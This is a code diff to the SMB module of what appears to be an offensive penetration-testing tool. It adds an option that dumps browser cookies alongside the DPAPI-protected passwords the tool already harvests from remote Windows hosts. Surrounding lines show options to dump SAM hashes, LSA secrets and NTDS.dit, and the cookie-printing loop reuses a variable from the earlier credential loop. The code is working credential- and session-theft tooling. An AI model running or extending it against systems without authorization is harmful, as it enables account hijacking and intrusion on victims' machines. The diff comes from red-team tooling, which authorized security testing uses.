@@ -173,7 +173,7 @@ class smb(connection):
         cegroup.add_argument("--sam", action='store_true', help='dump SAM hashes from target systems')
         cegroup.add_argument("--lsa", action='store_true', help='dump LSA secrets from target systems')
         cegroup.add_argument("--ntds", choices={'vss', 'drsuapi'}, nargs='?', const='drsuapi', help="dump the NTDS.dit from target DCs using the specifed method\n(default: drsuapi)")
-        cegroup.add_argument("--dpapi", action='store_true', help='dump DPAPI secrets from target systems')
+        cegroup.add_argument("--dpapi", choices={'password', 'cookies'}, nargs='?', const='password', help='dump DPAPI secrets from target systems, can dump cookies if you add "cookies"\n(default: password)')
         #cgroup.add_argument("--ntds-history", action='store_true', help='Dump NTDS.dit password history')
         #cgroup.add_argument("--ntds-pwdLastSet", action='store_true', help='Shows the pwdLastSet attribute for each NTDS.dit account')
 
@@ -1191,7 +1191,7 @@ class smb(connection):
             except Exception as e:
                 self.logger.error(str(e))
 
-        if self.pvkbytes is None and self.no_da == None:
+        if self.pvkbytes is None and self.no_da == None and self.args.local_auth == False:
             try:
                 results = self.db.get_domain_backupkey(self.domain)
             except:
@@ -1257,6 +1257,7 @@ class smb(connection):
 
         # Collect User and Machine masterkeys
         try:
+            self.logger.success("Collecting User and Machine masterkeys, grab a coffee and be patient...")
             masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=self.pvkbytes, passwords=plaintexts, nthashes=nthashes)
             masterkeys += masterkeys_triage.triage_masterkeys()
             masterkeys += masterkeys_triage.triage_system_masterkeys()
@@ -1285,14 +1286,21 @@ class smb(connection):
 
         try:
             # Collect Chrome Based Browser stored secrets
+            dump_cookies = True if self.args.dpapi == "cookies" else False
             browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys)
-            browser_credentials, _ = browser_triage.triage_browsers()
+            browser_credentials, cookies = browser_triage.triage_browsers(gather_cookies=dump_cookies)
         except Exception as e:
             self.logger.debug("Error while looting browsers: {}".format(e))
         for credential in browser_credentials:
             self.logger.highlight("[%s][%s] %s %s:%s" % (credential.winuser, credential.browser.upper(), credential.url+' -' if credential.url!= '' else '-', credential.username, credential.password))
             self.db.add_dpapi_secrets(target.address, credential.browser.upper(), credential.winuser, credential.username, credential.password, credential.url)
         
+        if dump_cookies:
+            self.logger.info("Start Dumping Cookies")
+            for cookie in cookies:
+                self.logger.highlight("[%s][%s] %s%s - %s:%s" % (credential.winuser, cookie.browser.upper(), cookie.host, cookie.path, cookie.cookie_name, cookie.cookie_value))
+            self.logger.info("End Dumping Cookies")
+
         try:
             # Collect User Internet Explorer stored secrets
             vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys)
